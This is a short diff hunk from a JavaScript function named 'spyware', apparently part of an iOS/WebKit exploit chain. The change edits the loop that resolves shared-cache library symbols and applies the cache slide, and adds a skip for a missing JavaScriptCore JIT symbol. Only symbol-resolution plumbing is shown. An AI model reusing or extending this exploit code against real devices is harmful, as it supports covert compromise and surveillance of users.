@@ -348,14 +348,18 @@ function spyware(stage1, memory, binary)
         }
     }
     var k = Object.values(libs).reduce(function(p,c){ c.forEach(function(e){ p.push(e) });return p; }, []);
-    for(var i = 0; i < k.length; ++i)
-    {
-        var s = k[i];
-        if(syms[s] == null)
-        {
-            fail(s);
+    for (var i = 0; i < k.length; ++i) {
+        var s = k[i]
+        
+        if (syms[s] == null && // this is stupid bullshit pls close ur eyes
+            s == "__ZN3JSC29jitWriteSeparateHeapsFunctionE") 
+            continue
+
+        if (syms[s] == null) {
+            fail(s)
         }
-        syms[s] = Add(syms[s], cache_slide);
+
+        syms[s] = Add(syms[s], cache_slide)
     }
     k = Object.keys(opcodes);
     for(var i = 0; i < k.length; ++i)
